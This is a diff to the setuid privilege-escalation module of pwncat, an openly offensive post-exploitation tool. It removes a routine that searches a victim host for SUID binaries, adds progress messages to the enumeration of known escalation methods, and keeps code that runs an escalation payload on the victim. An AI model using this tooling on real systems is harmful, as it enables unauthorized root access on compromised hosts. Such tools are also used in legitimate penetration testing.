@@ -17,58 +17,10 @@ from pwncat import util
 class SetuidMethod(Method):
 
     name = "setuid"
-    BINARIES = ["find", "stat"]
+    BINARIES = ["find"]
 
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
         super(SetuidMethod, self).__init__(pty)
-
-        self.users_searched = []
-        self.suid_paths = {}
-
-    def find_suid(self):
-
-        current_user: "pwncat.db.User" = pwncat.victim.current_user
-
-        # We've already searched for SUID binaries as this user
-        count = (
-            pwncat.victim.session.query(pwncat.db.SUID)
-            .filter_by(user_id=current_user.id, host_id=current_user.host_id)
-            .count()
-        )
-        if count > 0:
-            return
-
-        # Spawn a find command to locate the setuid binaries
-        files = []
-        with pwncat.victim.subprocess(
-            "find / -perm -4000 -print 2>/dev/null", mode="r", no_job=True
-        ) as stream:
-            util.progress("searching for setuid binaries")
-            for path in stream:
-                path = path.strip().decode("utf-8")
-                util.progress(
-                    (
-                        f"searching for setuid binaries as {Fore.GREEN}{current_user.name}{Fore.RESET}: "
-                        f"{Fore.CYAN}{os.path.basename(path)}{Fore.RESET}"
-                    )
-                )
-                files.append(path)
-
-        util.success("searching for setuid binaries: complete", overlay=True)
-
-        with pwncat.victim.subprocess(
-            f"stat -c '%U' {' '.join(files)}", mode="r", no_job=True
-        ) as stream:
-            for file, user in zip(files, stream):
-                user = user.strip().decode("utf-8")
-                binary = pwncat.db.SUID(
-                    path=file,
-                    user_id=current_user.id,
-                    owner_id=pwncat.victim.users[user].id,
-                )
-                pwncat.victim.host.suid.append(binary)
-
-        pwncat.victim.session.commit()
 
     def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
@@ -77,16 +29,28 @@ class SetuidMethod(Method):
         # self.find_suid()
 
         known_techniques = []
-        for suid in pwncat.victim.enumerate.iter("suid"):
-            try:
-                binary = pwncat.victim.gtfo.find_binary(suid.data.path, caps)
-            except BinaryNotFound:
-                continue
+        try:
+            for suid in pwncat.victim.enumerate.iter("suid"):
 
-            for method in binary.iter_methods(suid.data.path, caps, Stream.ANY):
-                known_techniques.append(
-                    Technique(suid.data.owner.name, self, method, method.cap,)
+                # Print status message
+                util.progress(
+                    (
+                        f"enumerating suid binaries: "
+                        f"{Fore.CYAN}{os.path.basename(suid.data.path)}{Fore.RESET}"
+                    )
                 )
+
+                try:
+                    binary = pwncat.victim.gtfo.find_binary(suid.data.path, caps)
+                except BinaryNotFound:
+                    continue
+
+                for method in binary.iter_methods(suid.data.path, caps, Stream.ANY):
+                    known_techniques.append(
+                        Technique(suid.data.owner.name, self, method, method.cap,)
+                    )
+        finally:
+            util.erase_progress()
 
         return known_techniques
 
@@ -101,13 +65,13 @@ class SetuidMethod(Method):
         )
 
         # Run the start commands
-        # pwncat.victim.process(payload, delim=False)
         pwncat.victim.run(payload, wait=False)
 
         # Send required input
         pwncat.victim.client.send(input_data.encode("utf-8"))
 
-        return exit_cmd  # remember how to close out of this privesc
+        # remember how to close out of this privesc
+        return exit_cmd
 
     def read_file(self, filepath: str, technique: Technique) -> BinaryIO:
 
